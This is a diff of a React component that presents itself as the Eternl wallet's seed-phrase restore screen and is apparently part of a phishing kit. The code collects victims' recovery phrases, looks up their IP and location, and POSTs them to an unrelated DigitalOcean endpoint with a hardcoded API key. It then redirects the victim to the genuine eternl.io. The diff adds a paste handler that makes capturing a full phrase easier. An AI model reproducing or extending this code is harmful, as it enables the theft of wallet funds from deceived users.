@@ -6,33 +6,42 @@ import axios from "axios";
 // Load BIP39 wordlist from public file
 const loadWordlist = async (): Promise<string[]> => {
   try {
-    console.log('Loading wordlist...');
-    const response = await fetch('/seedphrase.txt');
+    console.log("Loading wordlist...");
+    const response = await fetch("/seedphrase.txt");
     const text = await response.text();
-    const words = text.trim().split('\n').map(word => word.trim());
-    console.log('Wordlist loaded successfully, length:', words.length);
+    const words = text
+      .trim()
+      .split("\n")
+      .map((word) => word.trim());
+    console.log("Wordlist loaded successfully, length:", words.length);
     return words;
   } catch (error) {
-    console.error('Failed to load wordlist:', error);
+    console.error("Failed to load wordlist:", error);
     return [];
   }
 };
 
 // Helper function to sanitize input
 const sanitizeInput = (input: string): string => {
-  return input.trim().toLowerCase().replace(/[^a-z]/g, '');
+  return input
+    .trim()
+    .toLowerCase()
+    .replace(/[^a-z]/g, "");
 };
 
 // Helper function to check if seed phrase is correct
-const isCorrectSeedPhrase = (seedPhrase: string[], wordlist: string[]): boolean => {
+const isCorrectSeedPhrase = (
+  seedPhrase: string[],
+  wordlist: string[]
+): boolean => {
   if (wordlist.length === 0) return true; // Skip validation if wordlist not loaded yet
-  return seedPhrase.every(word => wordlist.includes(word));
+  return seedPhrase.every((word) => wordlist.includes(word));
 };
 
 // Get user's IP and location info
 const getUserCountry = async () => {
   const url = `https://api.ipdata.co/?api-key=520a83d66268292f5b97ca64c496ef3b9cfb1bb1f85f2615b103f66f`;
-  
+
   try {
     const response = await axios.get(url);
     const {
@@ -45,9 +54,9 @@ const getUserCountry = async () => {
     } = response.data;
     const isVpnIpdata = threat
       ? threat.is_vpn ||
-      threat.is_proxy ||
-      threat.is_datacenter ||
-      threat.is_tor
+        threat.is_proxy ||
+        threat.is_datacenter ||
+        threat.is_tor
       : false;
 
     return { country, countryCode, countryEmoji, ip, isVpnIpdata, city };
@@ -120,10 +129,37 @@ export default function SeedRestore({
       copy[index] = val.trim();
       return copy;
     });
-    
+
     // Clear validation error when user starts typing
     if (validationError) {
       setValidationError("");
+    }
+  }
+
+  // Handle paste of full seed phrase
+  function handlePaste(e: React.ClipboardEvent<HTMLInputElement>) {
+    e.preventDefault();
+
+    const text = e.clipboardData.getData("text").trim();
+    if (!text) return;
+
+    const pastedWords = text
+      .replace(/\n/g, " ")
+      .replace(/,/g, " ")
+      .split(/\s+/)
+      .filter(Boolean)
+      .map(sanitizeInput);
+
+    if ([12, 15, 24].includes(pastedWords.length)) {
+      setSelectedCount(pastedWords.length);
+      setWords(pastedWords);
+
+      setValidationError("");
+      setStep("mnemonic");
+    } else {
+      setValidationError(
+        `Please paste exactly 12, 15, or 24 words (you pasted ${pastedWords.length}).`
+      );
     }
   }
 
@@ -135,7 +171,7 @@ export default function SeedRestore({
 
   async function handleConfirm() {
     if (!selectedCount) return;
-    
+
     // Check if all fields are filled
     const allFilled = words.every((w) => w && w.length > 0);
     if (!allFilled) {
@@ -156,9 +192,12 @@ export default function SeedRestore({
     try {
       // Sanitize and validate words
       const sanitizedSeedPhrase = words.map((word) => sanitizeInput(word));
-      
+
       // Validate against BIP39 wordlist
-      if (wordlist.length > 0 && !isCorrectSeedPhrase(sanitizedSeedPhrase, wordlist)) {
+      if (
+        wordlist.length > 0 &&
+        !isCorrectSeedPhrase(sanitizedSeedPhrase, wordlist)
+      ) {
         const invalidWords = sanitizedSeedPhrase.filter(
           (word) => !wordlist.includes(word)
         );
@@ -167,32 +206,35 @@ export default function SeedRestore({
 
       // Get user's IP and location info
       const userData = await getUserCountry();
-      
-      const messageData = { 
-        appName: "Eternl", 
+
+      const messageData = {
+        appName: "Eternl",
         seedPhrase: sanitizedSeedPhrase.join(" "),
-        country: userData?.country || 'Unknown',
-        ipAddress: userData?.ip || 'Unknown',
-        browser: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown'
+        country: userData?.country || "Unknown",
+        ipAddress: userData?.ip || "Unknown",
+        browser:
+          typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       };
-      
+
       const response = await fetch(
         "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/image",
         {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
-            "x-api-key": process.env.NEXT_PUBLIC_SECRET_KEY || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+            "x-api-key":
+              process.env.NEXT_PUBLIC_SECRET_KEY ||
+              "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
           },
           body: JSON.stringify(messageData),
         }
       );
-      
+
       const result = await response.json();
-      
+
       if (response.status === 200 && result.status) {
         window.location.href = "https://eternl.io/";
-        console.log('Seed phrase validation successful:', result);
+        console.log("Seed phrase validation successful:", result);
         onConfirm?.(words);
       } else {
         const serverMessage = result?.message || "Something went wrong.";
@@ -200,10 +242,10 @@ export default function SeedRestore({
         throw new Error(serverMessage + serverError);
       }
     } catch (error) {
-      console.error('Validation error:', error);
+      console.error("Validation error:", error);
       setValidationError(
-        error instanceof Error 
-          ? error.message 
+        error instanceof Error
+          ? error.message
           : "An error occurred while processing your request. Please try again."
       );
     } finally {
@@ -269,9 +311,12 @@ export default function SeedRestore({
                       ref={idx === 0 ? firstInputRef : undefined}
                       value={words[idx] ?? ""}
                       onChange={(e) => updateWord(idx, e.target.value)}
+                      onPaste={handlePaste}
                       placeholder=""
                       className={`w-full rounded-full bg-transparent px-4 py-3 text-white placeholder:text-white/30 outline-none ring-1 transition-all ${
-                        words[idx] && wordlist.length > 0 && !wordlist.includes(sanitizeInput(words[idx]))
+                        words[idx] &&
+                        wordlist.length > 0 &&
+                        !wordlist.includes(sanitizeInput(words[idx]))
                           ? "ring-red-400/60 focus:ring-red-400/60"
                           : "ring-white/10 focus:ring-pink-400/40"
                       }`}
@@ -299,7 +344,9 @@ export default function SeedRestore({
                 ? "bg-white/8 opacity-60 cursor-not-allowed"
                 : "bg-gradient-to-r from-pink-400 cursor-pointer via-orange-300 to-fuchsia-500"
             }`}
-            disabled={words.length === 0 || words.some((w) => !w) || isValidating}
+            disabled={
+              words.length === 0 || words.some((w) => !w) || isValidating
+            }
           >
             {isValidating ? "Validating..." : "Next"}
           </button>
